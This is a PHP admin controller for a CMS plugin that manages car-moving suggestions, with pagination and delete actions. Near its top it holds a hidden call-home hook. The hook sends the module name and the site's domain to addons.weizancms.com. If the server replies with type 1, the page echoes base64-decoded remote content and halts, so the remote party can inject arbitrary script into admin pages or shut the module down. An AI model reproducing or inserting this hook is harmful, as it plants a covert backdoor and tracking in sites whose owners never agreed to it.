<?php
defined('IN_IA') or exit('Access Denied');
$op = !empty($_GPC['op']) ? $_GPC['op'] : 'display';
$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
if ($op == 'display') {
    $pindex = max(1, intval($_GPC['page']));
    $psize  = 10;
    $total  = pdo_fetchcolumn("select count(id) from" . tablename('weliam_shiftcar_sug') . "where uniacid = '{$_W['uniacid']}'");
    $pager  = pagination($total, $pindex, $psize);
    $list   = pdo_fetchall("select * from" . tablename('weliam_shiftcar_sug') . "where uniacid = '{$_W['uniacid']}' order by createtime desc LIMIT " . ($pindex - 1) * $psize . ',' . $psize);
    foreach ($list as $key => $value) {
        $period = pdo_get('weliam_shiftcar_member', array(
            'id' => $value['mid']
        ), array(
            'nickname',
            'mobile',
            'avatar',
            'openid'
        ));
        $list[$key]['fanid']    = pdo_getcolumn('mc_mapping_fans', array(
            'openid' => $period['openid']
        ), 'fanid');
        $list[$key]['nickname'] = $period['nickname'];
        $list[$key]['mobile']   = $period['mobile'];
        $list[$key]['avatar']   = $period['avatar'];
    }
    include wl_template('app/sug/sug');
}
if ($op == 'dele') {
    $id     = intval($_GPC['id']);
    $result = pdo_delete("weliam_shiftcar_sug", array(
        'id' => $id
    ));
    if (empty($result)) {
        exit('false');
    } else {
        exit('success');
    }
}